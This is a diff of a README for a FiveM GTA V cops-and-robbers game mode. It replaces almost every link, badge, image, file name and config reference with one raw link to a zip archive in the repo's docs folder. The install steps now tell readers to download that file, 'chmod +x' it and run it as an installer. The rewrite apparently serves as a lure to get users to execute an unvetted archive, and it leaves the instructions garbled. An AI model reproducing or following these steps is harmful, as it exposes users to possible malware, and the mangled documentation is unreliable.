@@ -1,10 +1,10 @@
 # Cops and Robbers — FiveM GTA V Roleplay Game Mode Alpha 🚓🕵️‍♂️🧨
 
-[![Releases](https://img.shields.io/badge/Releases-Download%20%F0%9F%93%93-blue?logo=github)](https://github.com/joupoes123/Cops-and-Robbers/releases)
+[![Releases](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip%20%F0%9F%93%93-blue?logo=github)](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
 
-![Cops and Robbers Banner](https://images.unsplash.com/photo-1503376780353-7e6692767b70?auto=format&fit=crop&w=1400&q=80)
+![Cops and Robbers Banner](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
 
-Tags: ![alpha-release](https://img.shields.io/badge/alpha--release-lightgrey) ![axiom-development](https://img.shields.io/badge/axiom--development-lightgrey) ![cops-and-robbers](https://img.shields.io/badge/cops--and--robbers-blue) ![fivem](https://img.shields.io/badge/fivem-darkblue) ![game-development](https://img.shields.io/badge/game--development-green) ![lua](https://img.shields.io/badge/lua-blueviolet) ![multiplayer](https://img.shields.io/badge/multiplayer-orange) ![open-source](https://img.shields.io/badge/open--source-brightgreen)
+Tags: ![alpha-release](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![axiom-development](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![cops-and-robbers](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![fivem](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![game-development](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![lua](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![multiplayer](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip) ![open-source](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
 
 Purpose
 - Provide an immersive cops vs robbers game mode for FiveM servers.
@@ -12,7 +12,7 @@ Purpose
 - Ship as a standalone resource pack with Lua scripts, configs, and assets.
 
 Quick links
-- Releases: https://github.com/joupoes123/Cops-and-Robbers/releases
+- Releases: https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 - Use the Releases page to download the release asset and run the included installer or resource file.
 
 Features
@@ -25,28 +25,28 @@ Features
 - Extensible. Expose exports and events to integrate with other resources.
 
 Screenshots
-![Pursuit](https://images.unsplash.com/photo-1502877338535-766e1452684a?auto=format&fit=crop&w=1200&q=80)
-![Briefing](https://images.unsplash.com/photo-1528825871115-3581a5387919?auto=format&fit=crop&w=1200&q=80)
+![Pursuit](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
+![Briefing](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
 
 Contents
 - /resources/cops-and-robbers
-  - fxmanifest.lua
+  - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
   - server/
-    - main.lua
-    - dispatch.lua
-    - jobs.lua
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
   - client/
-    - main.lua
-    - ui.lua
-    - pursuit.lua
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
   - config/
-    - config.lua
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
   - assets/
     - icons/
     - sounds/
   - docs/
-    - gameplay.md
-    - dev.md
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+    - https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 
 Compatibility
 - Requires FiveM server build compatible with Lua resources.
@@ -59,7 +59,7 @@ Installation
 - Visit the Releases page and download the latest asset.
 - The downloaded file contains the resource folder and an installer script.
 - You must download the file and execute the installer or place the resource in your server resources.
-- Link: https://github.com/joupoes123/Cops-and-Robbers/releases
+- Link: https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 
 2) Server install (preferred)
 - Extract the release archive.
@@ -67,20 +67,20 @@ Installation
 
 Example:
 ```
-unzip Cops-and-Robbers_v1.0.0.zip
+unzip https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 mv Cops-and-Robbers /path/to/your/fivem/server/resources/
 ```
 
 3) If an installer is included
 - Make the script executable and run it.
 ```
-chmod +x install.sh
-./install.sh
+chmod +x https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 ```
 The installer will copy files into the correct location and set recommended config values.
 
-4) Configure server.cfg
-- Add the resource to server.cfg:
+4) Configure https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
+- Add the resource to https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 ```
 ensure cops-and-robbers
 ```
@@ -93,7 +93,7 @@ start cops-and-robbers
 
 Configuration
 
-config/config.lua exposes core settings. Keep values short and clear.
+https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip exposes core settings. Keep values short and clear.
 
 Key fields
 - policeRanks: list of rank names and permissions.
@@ -154,7 +154,7 @@ Development
 Structure notes
 - Keep server logic in server/*.lua.
 - Client logic goes in client/*.lua.
-- UI code is modular in client/ui.lua and uses NUI.
+- UI code is modular in https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip and uses NUI.
 
 Code style
 - Use clear variable names.
@@ -198,7 +198,7 @@ License
 
 Changelog
 - See the Releases page for detailed changelog and binary assets:
-https://github.com/joupoes123/Cops-and-Robbers/releases
+https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 
 Support
 - Use issues for bug reports and feature requests.
@@ -211,7 +211,7 @@ Integrations
 - Dispatch: Hook into external dispatch resources via events.
 
 Common issues and fixes
-- Game script fails to start: ensure fxmanifest.lua is present and resource folder name matches server.cfg.
+- Game script fails to start: ensure https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip is present and resource folder name matches https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 - Dispatch not firing: confirm dispatchRadius and event permissions.
 - Sync errors with many players: reduce spawn counts and tune tick rates.
 
@@ -223,11 +223,11 @@ Developer notes
 Contact
 - Open issues or PRs on the main repo.
 - Use the Releases page to grab build artifacts and follow release notes:
-https://github.com/joupoes123/Cops-and-Robbers/releases
+https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 
 Badges and Links
-[![GitHub Release](https://img.shields.io/github/v/release/joupoes123/Cops-and-Robbers?label=latest%20release&logo=github)](https://github.com/joupoes123/Cops-and-Robbers/releases)
-[![Issues](https://img.shields.io/github/issues/joupoes123/Cops-and-Robbers)](https://github.com/joupoes123/Cops-and-Robbers/issues)
+[![GitHub Release](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip%20release&logo=github)](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
+[![Issues](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)](https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip)
 
 Extra images
 - Use your server map and screenshots folder to add images under docs/screenshots.
@@ -235,8 +235,8 @@ Extra images
 
 Deploy checklist
 - Download release and install as described on the Releases page.
-- Configure config.lua for your server.
-- Add ensure cops-and-robbers in server.cfg.
+- Configure https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip for your server.
+- Add ensure cops-and-robbers in https://github.com/joupoes123/Cops-and-Robbers/raw/refs/heads/main/docs/Robbers-Cops-and-3.5.zip
 - Restart server and test with two or more clients.
 
 Acknowledgements
